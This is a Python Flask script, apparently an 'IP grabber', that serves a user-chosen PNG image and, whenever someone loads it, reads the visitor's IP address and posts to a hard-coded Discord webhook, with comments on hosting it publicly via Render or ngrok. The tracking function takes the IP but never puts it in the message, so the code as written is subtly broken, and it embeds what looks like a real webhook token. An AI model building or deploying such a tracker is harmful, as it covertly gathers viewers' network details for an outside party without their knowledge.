from flask import Flask, request, send_file
import threading
import requests
import tkinter as tk
from tkinter import filedialog

app = Flask(__name__)

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1369953205349519380/zAmptjF_CZ3l5xyJ12DOIf3GWQatSNJKepjL_d7r3FL5-QxXhh_msIOjXj4WMEECZjxz'
PUBLIC_URL = ''  # PUT YOUR RENDER URL HERE (like https://yourapp.onrender.com/image.png)

image_path = ''

def send_ip_to_discord(ip):
    data = {
        "content": "Log Info",
        "embeds": [
            {
                "image": {"url": PUBLIC_URL}
            }
        ]
    }
    requests.post(DISCORD_WEBHOOK_URL, json=data)

@app.route('/image.png')
def serve_image():
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    send_ip_to_discord(visitor_ip)
    return send_file(image_path, mimetype='image/png')

def start_flask():
    app.run(host='0.0.0.0', port=8000)

def browse_image():
    global image_path
    root = tk.Tk()
    root.withdraw()
    image_path = filedialog.askopenfilename(filetypes=[("PNG files", "*.png")])
    if image_path:
        print(f"Serving image: {image_path}")
        print("Set the PUBLIC_URL to your Render or ngrok URL + /image.png")

if __name__ == '__main__':
    browse_image()
    if image_path:
        threading.Thread(target=start_flask).start()

